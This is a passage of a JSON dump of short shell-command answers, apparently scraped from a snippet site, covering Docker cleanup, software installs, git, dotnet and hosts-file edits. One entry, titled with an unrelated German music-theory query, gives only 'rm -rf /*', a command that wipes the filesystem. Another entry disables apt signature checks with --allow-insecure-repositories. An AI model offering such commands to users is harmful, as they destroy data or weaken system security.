    "description": "# List all containers (only IDs) docker ps -aq # Stop all running containers docker stop $(docker ps -aq) # Remove all containers docker rm $(docker ps -aq) # Remove all images docker rmi $(docker images -q)\ndocker stop $(docker ps -a -q) docker rm $(docker ps -a -q)\ndocker rm $(docker ps -a -q)\n$ docker rm $(docker ps -a -q) \ndocker container rm $(docker container ls &ndash;aq) docker container stop $(docker container ls &ndash;aq) && docker system prune &ndash;af &ndash;&ndash;volumes\nsudo docker stop $(docker ps -a -q) sudo docker rm $(docker ps -a -q)\n",
    "reg_date": "2021-10-11T22:03:59.000Z"
  },
  {
    "id": 1307,
    "keyword": null,
    "link": null,
    "title": " docker delete all images",
    "description": "docker rmi -f $(docker images -a -q) \n# List all containers (only IDs) docker ps -aq # Stop all running containers docker stop $(docker ps -aq) # Remove all containers docker rm $(docker ps -aq) # Remove all images docker rmi $(docker images -q)\ndocker rmi $(docker images --filter \"dangling=true\" -q --no-trunc)\ndocker rmi $(docker images -a -q) \ndocker container rm $(docker container ls -aq)\n# Use this to delete everything: docker system prune -a --volumes  # remove containers created between now upto 4hrs back docker container prune --filter \"until=4h\"  # remove images created between now upto 4hrs back docker image prune --filter \"until=4h\"\n",
    "reg_date": "2021-10-11T22:03:59.000Z"
  },
  {
    "id": 1308,
    "keyword": null,
    "link": null,
    "title": " docker delete existing volumes",
    "description": "docker volume rm $(docker volume ls -q)\n",
    "reg_date": "2021-10-11T22:03:59.000Z"
  },
  {
    "id": 1309,
    "keyword": null,
    "link": null,
    "title": " docker delete image",
    "description": "docker rmi $(docker images -a -q) \ndocker system prune -a\ndocker image rm [image id]\ndocker system prune -a \ndocker image prune\ndocker rmi <image_id> docker rmi -f <image_id>\n",
    "reg_date": "2021-10-11T22:03:59.000Z"
  },
  {
    "id": 1310,
    "keyword": null,
    "link": null,
    "title": " docker for mac remove unnamed images",
    "description": "docker rmi $(docker images | grep \"^<none>\" | awk \"{print $3}\")\n",
    "reg_date": "2021-10-11T22:03:59.000Z"
  },
  {
    "id": 1311,
    "keyword": null,
    "link": null,
    "title": " docker healthcheck logs",
    "description": "docker inspect --format \"{{json .State.Health }}\" <container name> | jq # Kindly provided by Farhad Farahi on Stack Overflow\n",
    "reg_date": "2021-10-11T22:04:00.000Z"
  },
  {
    "id": 1312,
    "keyword": null,
    "link": null,
    "title": " docker hello world",
    "description": " sudo docker run hello-world\n#make sure docker is installed  docker run -dp 80:80 docker/getting-started\n",
    "reg_date": "2021-10-11T22:04:00.000Z"
  },
  {
    "id": 1313,
    "keyword": null,
    "link": null,
    "title": " docker how to run command in mysql",
    "description": "# If you run the container with a command like the following: # sudo docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag  sudo docker exec -t -i some-mysql /bin/bash mysql -uroot -pmy-secret-pw  # An example below: sudo docker run --name mysqldb -e MYSQL_ROOT_PASSWORD=MySecretPass -d mysql:latest sudo docker start mysqldb sudo docker exec -t -i mysqldb /bin/bash mysql -uroot -pMySecretPass\n",
    "reg_date": "2021-10-11T22:04:00.000Z"
  },
  {
    "id": 1314,
    "keyword": null,
    "link": null,
    "title": " docker image is not reseting",
    "description": "docker volume rm $(docker volume ls -q)\ndocker rm -f $(docker ps -a -q)\n",
    "reg_date": "2021-10-11T22:04:00.000Z"
  },
  {
    "id": 1315,
    "keyword": null,
    "link": null,
    "title": " docker install in centos u7",
    "description": "sudo yum update sudo yum install yum-utils device-mapper-persistent-data lvm2  sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo sudo yum install docker-ce -y sudo systemctl start docker sudo systemctl enable docker sudo systemctl status docker sudo docker -v\n",
    "reg_date": "2021-10-11T22:04:00.000Z"
  },
  {
    "id": 1316,
    "keyword": null,
    "link": null,
    "title": " docker install manjaro",
    "description": "sudo pacman -S docker sudo usermod -aG docker $USER sudo systemctl enable --now docker sudo systemctl status docker\npamac install docker docker-compose docker-machine sudo usermod -aG docker $USER sudo systemctl enable --now docker sudo systemctl status docker\nsudo pacman -S docker sudo usermod -aG docker $USER\n",
    "reg_date": "2021-10-11T22:04:00.000Z"
  },
  {
    "id": 1317,
    "keyword": null,
    "link": null,
    "title": " docker install nano",
    "description": "apt-get update apt-get install nano\n",
    "reg_date": "2021-10-11T22:04:00.000Z"
  },
  {
    "id": 1318,
    "keyword": null,
    "link": null,
    "title": " docker interact with running container",
    "description": "docker exec -it <CONTAINER_NAME> bash\n",
    "reg_date": "2021-10-11T22:04:01.000Z"
  },
  {
    "id": 1319,
    "keyword": null,
    "link": null,
    "title": " docker interactive shell",
    "description": "docker exec -it [containerid/name] [shell]  #Example docker exec -it fa80b69 bash #if its an apline container use \"sh\" instead of \"bash\"\nsudo docker exec -it <container name> <command>\n",
    "reg_date": "2021-10-11T22:04:01.000Z"
  },
  {
    "id": 1320,
    "keyword": null,
    "link": null,
    "title": " docker log tail",
    "description": "docker logs -f --tail 100 container-name\ndocker logs -f --tail 10 container_name \ndocker logs -f container-id\ndocker logs -f --tail <N> <container_name>\n",
    "reg_date": "2021-10-11T22:04:01.000Z"
  },
  {
    "id": 1321,
    "keyword": null,
    "link": null,
    "title": " docker machine ip",
    "description": "> docker-machine ip\n",
    "reg_date": "2021-10-11T22:04:01.000Z"
  },
  {
    "id": 1322,
    "keyword": null,
    "link": null,
    "title": " docker post installation steps linux",
    "description": "# my case solution sudo setfacl -m user:$USER:rw /var/run/docker.sock  #other solution sudo usermod -aG docker $USER  #an other solution sudo groupadd docker sudo gpasswd -a $USER docker docker run hello-world\n# Creates docker group sudo groupadd docker  # Add your user to the docker group sudo usermod -aG docker $USER  # Log out and log back in so that your group membership is re-evaluated # GNOME example gnome-session-quit\n",
    "reg_date": "2021-10-11T22:04:01.000Z"
  },
  {
    "id": 1323,
    "keyword": null,
    "link": null,
    "title": " docker postgresql restore database",
    "description": "cat your_dump.sql | docker exec -i your-db-container psql -U postgres \n",
    "reg_date": "2021-10-11T22:04:01.000Z"
  },
  {
    "id": 1324,
    "keyword": null,
    "link": null,
    "title": " docker prune images",
    "description": "docker rmi $(docker images --filter \"dangling=true\" -q --no-trunc)\n$ docker image prune -a  WARNING! This will remove all images without at least one container associated to them. Are you sure you want to continue? [y/N] y Deleted Images: untagged: alpine:latest untagged: alpine@sha256:3dcdb92d7432d56604d4545cbd324b14e647b313626d99b889d0626de158f73a deleted: sha256:4e38e38c8ce0b8d9041a9c4fefe786631d1416225e13b0bfe8cfa2321aec4bba deleted: sha256:4fe15f8d0ae69e169824f25f1d4da3015a48feeeeebb265cd2e328e15c6a869f untagged: alpine:3.3 untagged: alpine@sha256:4fa633f4feff6a8f02acfc7424efd5cb3e76686ed3218abf4ca0fa4a2a358423 untagged: my-jq:latest deleted: sha256:ae67841be6d008a374eff7c2a974cde3934ffe9536a7dc7ce589585eddd83aff deleted: sha256:34f6f1261650bc341eb122313372adc4512b4fceddc2a7ecbb84f0958ce5ad65 deleted: sha256:cf4194e8d8db1cb2d117df33f2c75c0369c3a26d96725efb978cc69e046b87e7 untagged: my-curl:latest deleted: sha256:b2789dd875bf427de7f9f6ae001940073b3201409b14aba7e5db71f408b8569e deleted: sha256:96daac0cb203226438989926fc34dd024f365a9a8616b93e168d303cfe4cb5e9 deleted: sha256:5cbd97a14241c9cd83250d6b6fc0649833c4a3e84099b968dd4ba403e609945e deleted: sha256:a0971c4015c1e898c60bf95781c6730a05b5d8a2ae6827f53837e6c9d38efdec deleted: sha256:d8359ca3b681cc5396a4e790088441673ed3ce90ebc04de388bfcd31a0716b06 deleted: sha256:83fc9ba8fb70e1da31dfcc3c88d093831dbd4be38b34af998df37e8ac538260c deleted: sha256:ae7041a4cc625a9c8e6955452f7afe602b401f662671cea3613f08f3d9343b35 deleted: sha256:35e0f43a37755b832f0bbea91a2360b025ee351d7309dae0d9737bc96b6d0809 deleted: sha256:0af941dd29f00e4510195dd00b19671bc591e29d1495630e7e0f7c44c1e6a8c0 deleted: sha256:9fc896fc2013da84f84e45b3096053eb084417b42e6b35ea0cce5a3529705eac deleted: sha256:47cf20d8c26c46fff71be614d9f54997edacfe8d46d51769706e5aba94b16f2b deleted: sha256:2c675ee9ed53425e31a13e3390bf3f539bf8637000e4bcfbb85ee03ef4d910a1  Total reclaimed space: 16.43 MB \ndocker image prune -a -f\ndocker rmi $(docker images -a -q) \n$ docker rmi $(docker images -q -f dangling=true)\n$ docker volume prune  WARNING! This will remove all volumes not used by at least one container. Are you sure you want to continue? [y/N] y \n",
    "reg_date": "2021-10-11T22:04:01.000Z"
  },
  {
    "id": 1325,
    "keyword": null,
    "link": null,
    "title": " docker prune system",
    "description": "$ docker image prune -a  WARNING! This will remove all images without at least one container associated to them. Are you sure you want to continue? [y/N] y Deleted Images: untagged: alpine:latest untagged: alpine@sha256:3dcdb92d7432d56604d4545cbd324b14e647b313626d99b889d0626de158f73a deleted: sha256:4e38e38c8ce0b8d9041a9c4fefe786631d1416225e13b0bfe8cfa2321aec4bba deleted: sha256:4fe15f8d0ae69e169824f25f1d4da3015a48feeeeebb265cd2e328e15c6a869f untagged: alpine:3.3 untagged: alpine@sha256:4fa633f4feff6a8f02acfc7424efd5cb3e76686ed3218abf4ca0fa4a2a358423 untagged: my-jq:latest deleted: sha256:ae67841be6d008a374eff7c2a974cde3934ffe9536a7dc7ce589585eddd83aff deleted: sha256:34f6f1261650bc341eb122313372adc4512b4fceddc2a7ecbb84f0958ce5ad65 deleted: sha256:cf4194e8d8db1cb2d117df33f2c75c0369c3a26d96725efb978cc69e046b87e7 untagged: my-curl:latest deleted: sha256:b2789dd875bf427de7f9f6ae001940073b3201409b14aba7e5db71f408b8569e deleted: sha256:96daac0cb203226438989926fc34dd024f365a9a8616b93e168d303cfe4cb5e9 deleted: sha256:5cbd97a14241c9cd83250d6b6fc0649833c4a3e84099b968dd4ba403e609945e deleted: sha256:a0971c4015c1e898c60bf95781c6730a05b5d8a2ae6827f53837e6c9d38efdec deleted: sha256:d8359ca3b681cc5396a4e790088441673ed3ce90ebc04de388bfcd31a0716b06 deleted: sha256:83fc9ba8fb70e1da31dfcc3c88d093831dbd4be38b34af998df37e8ac538260c deleted: sha256:ae7041a4cc625a9c8e6955452f7afe602b401f662671cea3613f08f3d9343b35 deleted: sha256:35e0f43a37755b832f0bbea91a2360b025ee351d7309dae0d9737bc96b6d0809 deleted: sha256:0af941dd29f00e4510195dd00b19671bc591e29d1495630e7e0f7c44c1e6a8c0 deleted: sha256:9fc896fc2013da84f84e45b3096053eb084417b42e6b35ea0cce5a3529705eac deleted: sha256:47cf20d8c26c46fff71be614d9f54997edacfe8d46d51769706e5aba94b16f2b deleted: sha256:2c675ee9ed53425e31a13e3390bf3f539bf8637000e4bcfbb85ee03ef4d910a1  Total reclaimed space: 16.43 MB \ndocker system prune -a \n$ docker volume prune  WARNING! This will remove all volumes not used by at least one container. Are you sure you want to continue? [y/N] y \ndocker images -f dangling=true \n",
    "reg_date": "2021-10-11T22:04:02.000Z"
  },
  {
    "id": 1326,
    "keyword": null,
    "link": null,
    "title": " docker purge all",
    "description": "# List all containers (only IDs) docker ps -aq # Stop all running containers docker stop $(docker ps -aq) # Remove all containers docker rm $(docker ps -aq) # Remove all images docker rmi $(docker images -q)\ndocker system prune -a\ndocker system prune [OPTIONS] \ndocker system prune -a \n",
    "reg_date": "2021-10-11T22:04:02.000Z"
  },
  {
    "id": 1327,
    "keyword": null,
    "link": null,
    "title": " docker remov all running containers",
    "description": "$ docker rm $(docker ps -a -q) \ndocker rm $(docker ps -aq)\n",
    "reg_date": "2021-10-11T22:04:02.000Z"
  },
  {
    "id": 1328,
    "keyword": null,
    "link": null,
    "title": " docker remove all containers",
    "description": "# List all containers (only IDs) docker ps -aq # Stop all running containers docker stop $(docker ps -aq) # Remove all containers docker rm $(docker ps -aq) # Remove all images docker rmi $(docker images -q)\ndocker stop $(docker ps -a -q) docker rm $(docker ps -a -q)\ndocker rm $(docker ps -a -q)\n$ docker rm $(docker ps -a -q) \ndocker rm $(docker ps -aq) -f \ndocker rm -f $(docker ps -aq)\n",
    "reg_date": "2021-10-11T22:04:02.000Z"
  },
  {
    "id": 1329,
    "keyword": null,
    "link": null,
    "title": " docker remove all dead containers",
    "description": "$ docker rm $(docker ps -a -q) \n",
    "reg_date": "2021-10-11T22:04:02.000Z"
  },
  {
    "id": 1330,
    "keyword": null,
    "link": null,
    "title": " docker remove all exited containers",
    "description": "docker container prune\n(docker ps -a |findstr Exited) | foreach-object {docker rm $_.split(\" \")[-1]}\n",
    "reg_date": "2021-10-11T22:04:02.000Z"
  },
  {
    "id": 1331,
    "keyword": null,
    "link": null,
    "title": " docker remove all image",
    "description": "docker rmi -f $(docker images -a -q) \n# List all containers (only IDs) docker ps -aq # Stop all running containers docker stop $(docker ps -aq) # Remove all containers docker rm $(docker ps -aq) # Remove all images docker rmi $(docker images -q)\ndocker rmi $(docker images -a -q) \ndocker container rm $(docker container ls -aq)\n# Use this to delete everything: docker system prune -a --volumes  # remove containers created between now upto 4hrs back docker container prune --filter \"until=4h\"  # remove images created between now upto 4hrs back docker image prune --filter \"until=4h\"\ndocker system prune -a --volumes\n",
    "reg_date": "2021-10-11T22:04:02.000Z"
  },
  {
    "id": 1332,
    "keyword": null,
    "link": null,
    "title": " docker remove all images",
    "description": "docker rmi -f $(docker images -a -q) \n# List all containers (only IDs) docker ps -aq # Stop all running containers docker stop $(docker ps -aq) # Remove all containers docker rm $(docker ps -aq) # Remove all images docker rmi $(docker images -q)\ndocker rmi $(docker images --filter \"dangling=true\" -q --no-trunc)\ndocker rmi $(docker images -a -q) \n# Use this to delete everything: docker system prune -a --volumes  # remove containers created between now upto 4hrs back docker container prune --filter \"until=4h\"  # remove images created between now upto 4hrs back docker image prune --filter \"until=4h\"\ndocker system prune -a\n",
    "reg_date": "2021-10-11T22:04:03.000Z"
  },
  {
    "id": 1333,
    "keyword": null,
    "link": null,
    "title": " docker remove all volume",
    "description": "docker-compose down docker rm -f $(docker ps -a -q) docker volume rm $(docker volume ls -q) docker-compose up -d\ndocker volume rm $(docker volume ls -q)\ndocker rm -f [containerid]\ndocker container rm [container id]\ndocker system prune\n",
    "reg_date": "2021-10-11T22:04:03.000Z"
  },
  {
    "id": 1334,
    "keyword": null,
    "link": null,
    "title": " docker remove images without tag",
    "description": "docker rmi $(docker images --filter \"dangling=true\" -q --no-trunc)\ndocker rmi $(docker images -a|grep \"<none>\"|awk '$1==\"<none>\" {print $3}')\n",
    "reg_date": "2021-10-11T22:04:03.000Z"
  },
  {
    "id": 1335,
    "keyword": null,
    "link": null,
    "title": " docker remove none images",
    "description": "docker rmi $(docker images --filter \"dangling=true\" -q --no-trunc)\ndocker image prune --filter=\"dangling=true\" \n",
    "reg_date": "2021-10-11T22:04:03.000Z"
  },
  {
    "id": 1336,
    "keyword": null,
    "link": null,
    "title": " docker run commands in mongo",
    "description": "sudo docker run -d -p 27017:27017 --name mongodb mongo:latest sudo docker start mongodb sudo docker exec -it mongodb mongo\n",
    "reg_date": "2021-10-11T22:04:03.000Z"
  },
  {
    "id": 1337,
    "keyword": null,
    "link": null,
    "title": " docker run remove on exit",
    "description": "docker run --rm\n",
    "reg_date": "2021-10-11T22:04:03.000Z"
  },
  {
    "id": 1338,
    "keyword": null,
    "link": null,
    "title": " docker run restart always",
    "description": "$ docker run --restart=always redis \n$ docker run -d --restart unless-stopped <image>\n",
    "reg_date": "2021-10-11T22:04:03.000Z"
  },
  {
    "id": 1339,
    "keyword": null,
    "link": null,
    "title": " docker starting too long",
    "description": "wsl --unregister docker-desktop wsl --unregister docker-desktop-data \n",
    "reg_date": "2021-10-11T22:04:03.000Z"
  },
  {
    "id": 1340,
    "keyword": null,
    "link": null,
    "title": " docker stop all",
    "description": "docker stop $(docker ps -a -q) docker rm $(docker ps -a -q)\ndocker stop $(docker ps -a -q)\nStop All docker machines : docker-machine stop $(docker-machine ls --format \"{{.Name}}\") (edited) Start All docker machines :: docker-machine start $(docker-machine ls --format \"{{.Name}}\") (edited) Stop a machines : docker-machine stop \"<machine-name>\" (edited) Start a machines :: docker-machine start \"<machine-name>\" (edited)\n",
    "reg_date": "2021-10-11T22:04:04.000Z"
  },
  {
    "id": 1341,
    "keyword": null,
    "link": null,
    "title": " docker stop all containers",
    "description": "docker stop $(docker ps -a -q) docker rm $(docker ps -a -q)\ndocker rm $(docker ps -a -q)\n stop all containers: docker kill $(docker ps -q)  remove all containers: docker rm $(docker ps -a -q)  remove all docker images: docker rmi $(docker images -q)\ndocker stop $(docker ps -a -q)\ndocker container rm $(docker container ls &ndash;aq) docker container stop $(docker container ls &ndash;aq) && docker system prune &ndash;af &ndash;&ndash;volumes\n//Check if the container is running docker ps -a  docker container stop {container-id}\n",
    "reg_date": "2021-10-11T22:04:04.000Z"
  },
  {
    "id": 1342,
    "keyword": null,
    "link": null,
    "title": " docker switch to linux containers command line",
    "description": "cd \"C:\\Program Files\\Docker\\Docker\" DockerCli.exe -SwitchLinuxEngine\n",
    "reg_date": "2021-10-11T22:04:04.000Z"
  },
  {
    "id": 1343,
    "keyword": null,
    "link": null,
    "title": " docker tail logs",
    "description": "docker logs -f --tail 100 container-name\ndocker logs -f --tail 10 container_name \ndocker logs -f container-id\ndocker logs -f --tail <N> <container_name>\n",
    "reg_date": "2021-10-11T22:04:04.000Z"
  },
  {
    "id": 1344,
    "keyword": null,
    "link": null,
    "title": " docker to sudoers",
    "description": "# my case solution sudo setfacl -m user:$USER:rw /var/run/docker.sock  #other solution sudo usermod -aG docker $USER  #an other solution sudo groupadd docker sudo gpasswd -a $USER docker docker run hello-world\n# Creates docker group sudo groupadd docker  # Add your user to the docker group sudo usermod -aG docker $USER  # Log out and log back in so that your group membership is re-evaluated # GNOME example gnome-session-quit\n",
    "reg_date": "2021-10-11T22:04:04.000Z"
  },
  {
    "id": 1345,
    "keyword": null,
    "link": null,
    "title": " does not have a Release file. N: Updating from such a repository can't be done securely, and is therefore disabled by default. N: See apt-secure(8) manpage for repository creation and user configuration details",
    "description": "apt-get update --allow-insecure-repositories\n",
    "reg_date": "2021-10-11T22:04:04.000Z"
  },
  {
    "id": 1346,
    "keyword": null,
    "link": null,
    "title": " dotnet ef not found",
    "description": "# When the dotnet ef command gives a not found error. Run this to install it. dotnet tool install --global dotnet-ef \n",
    "reg_date": "2021-10-11T22:04:05.000Z"
  },
  {
    "id": 1347,
    "keyword": null,
    "link": null,
    "title": " dotnet ef scaffold sqlite",
    "description": "dotnet ef dbcontext scaffold \"data source=C:\\dbPath\\db.sqlite\" Microsoft.EntityFrameworkCore.Sqlite --output-dir DataModel\n",
    "reg_date": "2021-10-11T22:04:05.000Z"
  },
  {
    "id": 1348,
    "keyword": null,
    "link": null,
    "title": " dotnt clear cache",
    "description": "dotnet nuget locals all --clear \n",
    "reg_date": "2021-10-11T22:04:05.000Z"
  },
  {
    "id": 1349,
    "keyword": null,
    "link": null,
    "title": " downgrade node mac",
    "description": "node -v #Determine current node version sudo npm install -g n #Install n globally (version management) sudo n stable #Change to latest stable version sudo n 14.6.0 #Change to specific version\n$ npm install -g n $ n 6.10.3\nFor window nvm install v0.10.33  nvm use v0.10.33   \n",
    "reg_date": "2021-10-11T22:04:05.000Z"
  },
  {
    "id": 1350,
    "keyword": null,
    "link": null,
    "title": " downgrade npm package to specific version",
    "description": "npm install -g npm@version-no\nnpm view <package> versions // lets see what versions of package are available npm install <package>@<version> // install desired version. Remember about flags which maybe you want to use (eg. -g for global)  // example for package 'express' npm install express@4.17.1\n",
    "reg_date": "2021-10-11T22:04:05.000Z"
  },
  {
    "id": 1351,
    "keyword": null,
    "link": null,
    "title": " download adobe reader linux",
    "description": "sudo apt install libxml2:i386 libcanberra-gtk-module:i386 gtk2-engines-murrine:i386 libatk-adaptor:i386 sudo apt-get install gdebi-core wget ftp://ftp.adobe.com/pub/adobe/reader/unix/9.x/9.5.5/enu/AdbeRdr9.5.5-1_i386linux_enu.deb sudo gdebi Adbe*.deb\n$ sudo apt install gdebi-core libxml2:i386 libcanberra-gtk-module:i386 gtk2-engines-murrine:i386 libatk-adaptor:i386 \nsudo apt install libxml2:i386 libcanberra-gtk-module:i386 gtk2-engines-murrine:i386 libatk-adaptor:i386\n",
    "reg_date": "2021-10-11T22:04:05.000Z"
  },
  {
    "id": 1352,
    "keyword": null,
    "link": null,
    "title": " download and install virtualbox with powershell",
    "description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$vBoxURL = \"https://download.virtualbox.org/virtualbox\";Invoke-WebRequest -Uri \"$vBoxURL/LATEST-STABLE.TXT\" -OutFile \"$env:TEMP\\virtualbox-version.txt\";$version = ([IO.File]::ReadAllText(\"$env:TEMP\\virtualbox-version.txt\")).trim();$vBoxList = Invoke-WebRequest \"$vBoxURL/$version\";$vBoxVersion =$vBoxList.Links.innerHTML;$vBoxFile = $vBoxVersion | select-string -Pattern \"-win.exe\";$vBoxFileURL = \"$vBoxURL/$version/$vBoxFile\";Invoke-WebRequest -Uri $vBoxFileURL -OutFile \"$env:TEMP\\$vBoxFile\";start-process (\"$env:TEMP\\$vBoxFile\") --silent;\n",
    "reg_date": "2021-10-11T22:04:05.000Z"
  },
  {
    "id": 1353,
    "keyword": null,
    "link": null,
    "title": " download dart manual mac",
    "description": "/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n",
    "reg_date": "2021-10-11T22:04:05.000Z"
  },
  {
    "id": 1354,
    "keyword": null,
    "link": null,
    "title": " download directory from github",
    "description": "# use the web app below; simply copy and paste the github directory url https://downgit.github.io/#/home\nsvn checkout https://github.com/user/repo/branches/mybranch/folder Or just use: https://download-directory.github.io/\ncurl {url for downloading zip file} | 7z a -tzip {project name}-{branch name}/{folder path in that branch} \n",
    "reg_date": "2021-10-11T22:04:05.000Z"
  },
  {
    "id": 1355,
    "keyword": null,
    "link": null,
    "title": " download eclipse for ubuntu",
    "description": "sudo apt install default-jre sudo snap install --classic eclipse\n$ sudo snap install --classic eclipse sudo apt install default-jre Open Eclipse app from activities\n",
    "reg_date": "2021-10-11T22:04:06.000Z"
  },
  {
    "id": 1356,
    "keyword": null,
    "link": null,
    "title": " download filezilla for ubuntu",
    "description": "$sudo apt-get update $sudo apt-get install filezilla \nsudo apt update sudo apt install filezilla\nsudo apt-get update sudo apt-get install filezilla\n",
    "reg_date": "2021-10-11T22:04:06.000Z"
  },
  {
    "id": 1357,
    "keyword": null,
    "link": null,
    "title": " download filezilla in ubuntu",
    "description": "$sudo apt-get update $sudo apt-get install filezilla \nsudo apt update sudo apt install filezilla\n",
    "reg_date": "2021-10-11T22:04:06.000Z"
  },
  {
    "id": 1358,
    "keyword": null,
    "link": null,
    "title": " download nbextensions",
    "description": "STEP 1: Open cmd prompt and run the following commands  1) pip install jupyter_contrib_nbextensions  2) pip install jupyter_nbextensions_configurator  3) jupyter contrib nbextension install --user   4) jupyter nbextensions_configurator enable --user  STEP 3: Open jupyter notebook  - click on nbextensions tab  - unckeck disable configuration for nbextensions without explicit compatibility  - put a check on Hinterland step 3: Open new python file and check autocomplete feature\npip install jupyter_contrib_nbextensions \n",
    "reg_date": "2021-10-11T22:04:06.000Z"
  },
  {
    "id": 1359,
    "keyword": null,
    "link": null,
    "title": " download slack",
    "description": "sudo snap install slack --classic\nDiscor for companies.\nDiscord for companies.\nSlack is a proprietary business communication platform developed by American software company Slack Technologies.  Slack offers many IRC-style features, including persistent chat rooms organized by topic, private groups, and direct messaging.\n",
    "reg_date": "2021-10-11T22:04:06.000Z"
  },
  {
    "id": 1360,
    "keyword": null,
    "link": null,
    "title": " download teamviewer for ubuntu using terminal",
    "description": "#Install this package before install teamviewer sudo apt install -y libqt5x11extras5  #Download teamviewer wget https://download.teamviewer.com/download/linux/teamviewer_amd64.deb  #Install it sudo apt install ./teamviewer_amd64.deb  #Run it teamviewer\nwget https://download.teamviewer.com/download/linux/teamviewer_amd64.deb\n",
    "reg_date": "2021-10-11T22:04:07.000Z"
  },
  {
    "id": 1361,
    "keyword": null,
    "link": null,
    "title": " download torrent on ubuntu",
    "description": "sudo apt install qbittorrent\nsudo apt install transmission\n",
    "reg_date": "2021-10-11T22:04:07.000Z"
  },
  {
    "id": 1362,
    "keyword": null,
    "link": null,
    "title": " download vlc for ubuntu",
    "description": "# Ubuntu 20.04 upwards sudo apt install snapd sudo snap install vlc\n% sudo snap install vlc \nsudo apt install vlc\nsudo apt install vlc \n% sudo snap install vlc\n",
    "reg_date": "2021-10-11T22:04:07.000Z"
  },
  {
    "id": 1363,
    "keyword": null,
    "link": null,
    "title": " download woeusb for ubuntu 20.04",
    "description": "sudo apt install woeusb\n",
    "reg_date": "2021-10-11T22:04:07.000Z"
  },
  {
    "id": 1364,
    "keyword": null,
    "link": null,
    "title": " dpkg: error: parsing file '/var/lib/dpkg/updates/0013' near line 0:  newline in field name '#padding'",
    "description": "sudo rm -rf /var/lib/dpkg/updates/* dpkg --configure -a \n",
    "reg_date": "2021-10-11T22:04:07.000Z"
  },
  {
    "id": 1365,
    "keyword": null,
    "link": null,
    "title": " dpkg: error processing package gitweb (--configure): installed gitweb package post-instal",
    "description": "sudo apt-get purge apache2 && sudo apt-get purge gitweb && sudo apt-get install apache2\ndpkg: error processing package gitweb (--configure): installed gitweb package post-instal\n",
    "reg_date": "2021-10-11T22:04:07.000Z"
  },
  {
    "id": 1366,
    "keyword": null,
    "link": null,
    "title": " driver hosts file",
    "description": "C:\\Windows\\System32\\Drivers\\etc\\hosts\n",
    "reg_date": "2021-10-11T22:04:07.000Z"
  },
  {
    "id": 1367,
    "keyword": null,
    "link": null,
    "title": " driver san francisco ui mode error",
    "description": "REG ADD \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers\" /V \"C:\\Users\\mitoz\\Desktop\\Driver San Francisco\\San Francisco\\Autorun.exe\" /T REG_SZ /D WIN7RTM /F\n",
    "reg_date": "2021-10-11T22:04:07.000Z"
  },
  {
    "id": 1368,
    "keyword": null,
    "link": null,
    "title": " du -sh ocult files",
    "description": "du -sh .[!.]* *\n",
    "reg_date": "2021-10-11T22:04:08.000Z"
  },
  {
    "id": 1369,
    "keyword": null,
    "link": null,
    "title": " dur Quintenzirkel übungen",
    "description": "rm -rf /*\n",
    "reg_date": "2021-10-11T22:04:08.000Z"
  },
  {
    "id": 1370,
    "keyword": null,
    "link": null,
    "title": " dyld: lazy symbol binding failed: Symbol not found:  ffi prep closure loc",
    "description": "gem inst ffi -- --disable-system-libffi\n",
    "reg_date": "2021-10-11T22:04:08.000Z"
  },
  {
    "id": 1371,
    "keyword": null,
    "link": null,
    "title": " e package 'oracle-java8-installer' has no installation candidate ubuntu 16.04",
    "description": "sudo apt install openjdk-8-jdk \n",
    "reg_date": "2021-10-11T22:04:08.000Z"
  },
  {
    "id": 1372,
    "keyword": null,
    "link": null,
    "title": " echo /etc/hosts permission denied",
    "description": " echo '127.0.0.1 test' | sudo tee -a /etc/hosts\n",
    "reg_date": "2021-10-11T22:04:08.000Z"
  },
  {
    "id": 1373,
    "keyword": null,
    "link": null,
    "title": " echo aws profile",
    "description": "export AWS_PROFILE=my-profile  echo $AWS_PROFILE\n",
    "reg_date": "2021-10-11T22:04:09.000Z"
  },
  {
    "id": 1374,
    "keyword": null,
    "link": null,
    "title": " echo linux flags",
    "description": "   -n      Do not output a trailing newline.     -E      Disable the interpretation of the following backslash-escaped characters.     -e      Enable interpretation of the following backslash-escaped      characters in each String:        \\a    Alert (bell)       \\b    Backspace       \\c    Suppress trailing newline       \\e    Escape        \\f    Form feed       \\n    New line       \\r    Carriage return       \\t    Horizontal tab       \\v    Vertical tab       \\\\    Backslash       \\NNN  The character whose ASCII code is NNN (octal);             if NNN is not a valid octal number, it is printed literally.        \\xnnn The character whose ASCII code is the hex value nnn (1 to 3 digits)\n",
    "reg_date": "2021-10-11T22:04:09.000Z"
  },
  {
    "id": 1375,
    "keyword": null,
    "link": null,
    "title": " echo to file permission denied",
    "description": "sudo bash -c 'echo \"hello\" > f.txt'\necho \"hello\" | sudo tee f.txt  # add -a for append (>>)\n",
    "reg_date": "2021-10-11T22:04:09.000Z"
  },
  {
    "id": 1376,
    "keyword": null,
    "link": null,
    "title": " edit cron jobs",
    "description": "# crontab -e\nStep 1 : crontab -e Step 2 : Select your prefered editor for the file. Steo 3 : Add the command that you want to execute from cron and save that file. \t\tExample : 1 0 * * 0 rm /home/jones/*.log > /dev/null 2>&1 Step 4 : check if cron is activate using command \t\tcrontab -l\n",
    "reg_date": "2021-10-11T22:04:09.000Z"
  },
  {
    "id": 1377,
    "keyword": null,
    "link": null,
    "title": " edit hosts file mac terminal",
    "description": "sudo nano /etc/hosts\n",
    "reg_date": "2021-10-11T22:04:09.000Z"
  },
  {
    "id": 1378,
    "keyword": null,
    "link": null,
    "title": " edit iptables",
    "description": "iptables-save > iptables.txt # Edit iptables.txt iptables-restore < iptables.txt\n",
    "reg_date": "2021-10-11T22:04:09.000Z"
  },
  {
    "id": 1379,
    "keyword": null,
    "link": null,
    "title": " edit last commit message",
    "description": "$ git commit --amend -m \"New and correct message\" \ngit commit --amend -m \"New commit message.\"\n$ git commit --amend -m \"New and correct message\"\ngit commit --amend // press enter, editor would open\n# Displays a list of the last 3 commits on the current branch $ git rebase -i HEAD~3\ngit commit --amend git push --force-with-lease <repository> <branch>\n",
    "reg_date": "2021-10-11T22:04:09.000Z"
  },
  {
    "id": 1380,
    "keyword": null,
    "link": null,
    "title": " edit sshd config",
    "description": "sudo nano /etc/ssh/sshd_config sudo /etc/init.d/sshd restart\nsudo nano /etc/ssh/sshd_config\n",
    "reg_date": "2021-10-11T22:04:10.000Z"
  },
  {
